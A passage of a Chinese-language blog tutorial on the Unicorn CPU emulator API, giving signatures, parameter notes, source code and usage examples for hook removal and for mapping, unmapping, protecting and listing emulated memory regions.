class="line">        ptrs[i] = &amp;vals[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_open(UC_ARCH_X86, UC_MODE_64, &amp;uc))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_open"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"reg_write_batch(&#123;200, 10, 11, 12, 13, 14, 15&#125;)\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((err = uc_reg_write_batch(uc, syscall_abi, ptrs, <span class="number">7</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_reg_write_batch"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(vals, <span class="number">0</span>, <span class="keyword">sizeof</span>(vals));</span><br><span class="line">    <span class="keyword">if</span> ((err = uc_reg_read_batch(uc, syscall_abi, ptrs, <span class="number">7</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_reg_read_batch"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"reg_read_batch = &#123;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%"</span> PRIu64, vals[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"running syscall shellcode\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_hook_add(uc, &amp;sys_hook, UC_HOOK_CODE, hook_syscall, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_hook_add"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_mem_map(uc, BASE, <span class="number">0x1000</span>, UC_PROT_ALL))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_mem_map"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_mem_write(uc, BASE, CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_mem_write"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_emu_start(uc, BASE, BASE + <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_emu_start"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/20/aU1lbmxMjXA5g3K.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/20/aU1lbmxMjXA5g3K.png" class="lazyload"></a></p><p>对每条指令都进行hook</p><h3 id="uc-hook-del"><a href="#uc-hook-del" class="headerlink" title="uc_hook_del"></a>uc_hook_del</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uc_err uc_hook_del(uc_engine *uc, uc_hook hh);</span><br></pre></td></tr></table></figure></div><p>删除一个已注册的hook事件</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@hh: uc_hook_add() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_hook_del</span><span class="params">(uc_engine *uc, uc_hook hh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hook</span> *<span class="title">hook</span> = (<span class="title">struct</span> <span class="title">hook</span> *)<span class="title">hh</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; UC_HOOK_MAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (list_remove(&amp;uc-&gt;hook[i], (<span class="keyword">void</span> *)hook)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (--hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((err = uc_hook_add(uc, &amp;sys_hook, UC_HOOK_CODE, hook_syscall, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>))) &#123;</span><br><span class="line">    uc_perror(<span class="string">"uc_hook_add"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((err = uc_hook_del(uc, &amp;sys_hook))) &#123;</span><br><span class="line">    uc_perror(<span class="string">"uc_hook_del"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="uc-mem-map"><a href="#uc-mem-map" class="headerlink" title="uc_mem_map"></a>uc_mem_map</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_map</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">uint32_t</span> perms)</span></span>;</span><br></pre></td></tr></table></figure></div><p>为模拟映射一块内存。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@address: 要映射到的新内存区域的起始地址。这个地址必须与4KB对齐，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@size: 要映射到的新内存区域的大小。这个大小必须是4KB的倍数，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@perms: 新映射区域的权限。参数必须是UC_PROT_READ | UC_PROT_WRITE | UC_PROT_EXEC或这些的组合，否则返回UC_ERR_ARG错误。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_map</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">uint32_t</span> perms)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_err res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = mem_map_check(uc, address, <span class="built_in">size</span>, perms);    <span class="comment">//内存安全检查</span></span><br><span class="line">    <span class="keyword">if</span> (res)</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mem_map(uc, address, <span class="built_in">size</span>, perms, uc-&gt;memory_map(uc, address, <span class="built_in">size</span>, perms));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例同uc_hook_add。</p><h3 id="uc-mem-map-ptr"><a href="#uc-mem-map-ptr" class="headerlink" title="uc_mem_map_ptr"></a>uc_mem_map_ptr</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_map_ptr</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">uint32_t</span> perms, <span class="keyword">void</span> *ptr)</span></span>;</span><br></pre></td></tr></table></figure></div><p>在模拟中映射现有的主机内存。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@address: 要映射到的新内存区域的起始地址。这个地址必须与4KB对齐，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@size: 要映射到的新内存区域的大小。这个大小必须是4KB的倍数，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@perms: 新映射区域的权限。参数必须是UC_PROT_READ | UC_PROT_WRITE | UC_PROT_EXEC或这些的组合，否则返回UC_ERR_ARG错误。</span><br><span class="line">@ptr: 指向支持新映射内存的主机内存的指针。映射的主机内存的大小应该与size的大小相同或更大，并且至少使用PROT_READ | PROT_WRITE进行映射，否则不定义映射。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_map_ptr</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">uint32_t</span> perms, <span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_err res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = mem_map_check(uc, address, <span class="built_in">size</span>, perms);    <span class="comment">//内存安全检查</span></span><br><span class="line">    <span class="keyword">if</span> (res)</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mem_map(uc, address, <span class="built_in">size</span>, UC_PROT_ALL, uc-&gt;memory_map_ptr(uc, address, <span class="built_in">size</span>, perms, ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例同uc_mem_map</p><h3 id="uc-mem-unmap"><a href="#uc-mem-unmap" class="headerlink" title="uc_mem_unmap"></a>uc_mem_unmap</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_unmap</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br></pre></td></tr></table></figure></div><p>取消对模拟内存区域的映射</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@address: 要映射到的新内存区域的起始地址。这个地址必须与4KB对齐，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@size: 要映射到的新内存区域的大小。这个大小必须是4KB的倍数，否则将返回UC_ERR_ARG错误。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_unmap</span><span class="params">(struct uc_struct *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr;</span><br><span class="line">    <span class="keyword">size_t</span> count, len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// 没有要取消映射的区域</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 地址必须对齐到 uc-&gt;target_page_size</span></span><br><span class="line">    <span class="keyword">if</span> ((address &amp; uc-&gt;target_page_align) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 大小必须是 uc-&gt;target_page_size 的倍数</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">size</span> &amp; uc-&gt;target_page_align) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户请求的整个块是否被映射</span></span><br><span class="line">    <span class="keyword">if</span> (!check_mem_area(uc, address, <span class="built_in">size</span>))</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果这个区域跨越了相邻的区域，可能需要分割区域</span></span><br><span class="line">    addr = address;</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(count &lt; <span class="built_in">size</span>) &#123;</span><br><span class="line">        mr = memory_mapping(uc, addr);</span><br><span class="line">        len = (<span class="keyword">size_t</span>)MIN(<span class="built_in">size</span> - count, mr-&gt;<span class="built_in">end</span> - addr);</span><br><span class="line">        <span class="keyword">if</span> (!split_region(uc, mr, addr, len, <span class="literal">true</span>))</span><br><span class="line">            <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 取消映射</span></span><br><span class="line">        mr = memory_mapping(uc, addr);</span><br><span class="line">        <span class="keyword">if</span> (mr != <span class="literal">NULL</span>)</span><br><span class="line">           uc-&gt;memory_unmap(uc, mr);</span><br><span class="line">        count += len;</span><br><span class="line">        addr += len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((err = uc_mem_map(uc, BASE, <span class="number">0x1000</span>, UC_PROT_ALL))) &#123;</span><br><span class="line">    uc_perror(<span class="string">"uc_mem_map"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((err = uc_mem_unmap(uc, BASE, <span class="number">0x1000</span>))) &#123;</span><br><span class="line">    uc_perror(<span class="string">"uc_mem_unmap"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="uc-mem-protect"><a href="#uc-mem-protect" class="headerlink" title="uc_mem_protect"></a>uc_mem_protect</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_protect</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">uint32_t</span> perms)</span></span>;</span><br></pre></td></tr></table></figure></div><p>设置模拟内存的权限</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@address: 要映射到的新内存区域的起始地址。这个地址必须与4KB对齐，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@size: 要映射到的新内存区域的大小。这个大小必须是4KB的倍数，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@perms: 映射区域的新权限。参数必须是UC_PROT_READ | UC_PROT_WRITE | UC_PROT_EXEC或这些的组合，否则返回UC_ERR_ARG错误。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_protect</span><span class="params">(struct uc_struct *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">uint32_t</span> perms)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr = address;</span><br><span class="line">    <span class="keyword">size_t</span> count, len;</span><br><span class="line">    <span class="keyword">bool</span> remove_exec = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// trivial case, no change</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// address must be aligned to uc-&gt;target_page_size</span></span><br><span class="line">    <span class="keyword">if</span> ((address &amp; uc-&gt;target_page_align) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// size must be multiple of uc-&gt;target_page_size</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">size</span> &amp; uc-&gt;target_page_align) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check for only valid permissions</span></span><br><span class="line">    <span class="keyword">if</span> ((perms &amp; ~UC_PROT_ALL) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check that user's entire requested block is mapped</span></span><br><span class="line">    <span class="keyword">if</span> (!check_mem_area(uc, address, <span class="built_in">size</span>))</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we know entire region is mapped, so change permissions</span></span><br><span class="line">    <span class="comment">// We may need to split regions if this area spans adjacent regions</span></span><br><span class="line">    addr = address;</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(count &lt; <span class="built_in">size</span>) &#123;</span><br><span class="line">        mr = memory_mapping(uc, addr);</span><br><span class="line">        len = (<span class="keyword">size_t</span>)MIN(<span class="built_in">size</span> - count, mr-&gt;<span class="built_in">end</span> - addr);</span><br><span class="line">        <span class="keyword">if</span> (!split_region(uc, mr, addr, len, <span class="literal">false</span>))</span><br><span class="line">            <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line"></span><br><span class="line">        mr = memory_mapping(uc, addr);</span><br><span class="line">        <span class="comment">// will this remove EXEC permission?</span></span><br><span class="line">        <span class="keyword">if</span> (((mr-&gt;perms &amp; UC_PROT_EXEC) != <span class="number">0</span>) &amp;&amp; ((perms &amp; UC_PROT_EXEC) == <span class="number">0</span>))</span><br><span class="line">            remove_exec = <span class="literal">true</span>;</span><br><span class="line">        mr-&gt;perms = perms;</span><br><span class="line">        uc-&gt;readonly_mem(mr, (perms &amp; UC_PROT_WRITE) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        count += len;</span><br><span class="line">        addr += len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if EXEC permission is removed, then quit TB and continue at the same place</span></span><br><span class="line">    <span class="keyword">if</span> (remove_exec) &#123;</span><br><span class="line">        uc-&gt;quit_request = <span class="literal">true</span>;</span><br><span class="line">        uc_emu_stop(uc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((err = uc_mem_protect(uc, BASE, <span class="number">0x1000</span>, UC_PROT_ALL))) &#123;  <span class="comment">//可读可写可执行</span></span><br><span class="line">    uc_perror(<span class="string">"uc_mem_protect"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="uc-mem-regions"><a href="#uc-mem-regions" class="headerlink" title="uc_mem_regions"></a>uc_mem_regions</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_regions</span><span class="params">(uc_engine *uc, uc_mem_region **regions, <span class="keyword">uint32_t</span> *count)</span></span>;</span><br></pre></td></tr></table></figure></div><p>检索由 uc_mem_map() 和 uc_mem_map_ptr() 映射的内存的信息。</p><p>这个API为@regions分配内存，用户之后必须通过free()释放这些内存来避免内存泄漏。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@regions: 指向 uc_mem_region 结构体的数组的指针. 由Unicorn申请，必须通过uc_free()释放这些内存</span><br><span class="line">@count: 指向@regions中包含的uc_mem_region结构体的数量的指针</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码分析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">uc_mem_regions</span><span class="params">(uc_engine *uc, uc_mem_region **regions, <span class="keyword">uint32_t</span> *count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    uc_mem_region *r = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    *count = uc-&gt;mapped_block_count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*count) &#123;</span><br><span class="line">        r = g_malloc0(*count * <span class="keyword">sizeof</span>(uc_mem_region));</span><br><span class="line">        <span class="keyword">if</span> (r == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 内存不足</span></span><br><span class="line">            <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; *count; i++) &#123;</span><br><span class="line">        r[i].<span class="built_in">begin</span> = uc-&gt;mapped_blocks[i]-&gt;addr;</span><br><span class="line">        r[i].<span class="built_in">end</span> = uc-&gt;mapped_blocks[i]-&gt;<span class="built_in">end</span> - <span class="number">1</span>;</span><br><span class="line">        r[i].perms = uc-&gt;mapped_blocks[i]-&gt;perms;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *regions = r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_err err;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_open(UC_ARCH_X86, UC_MODE_64, &amp;uc))) 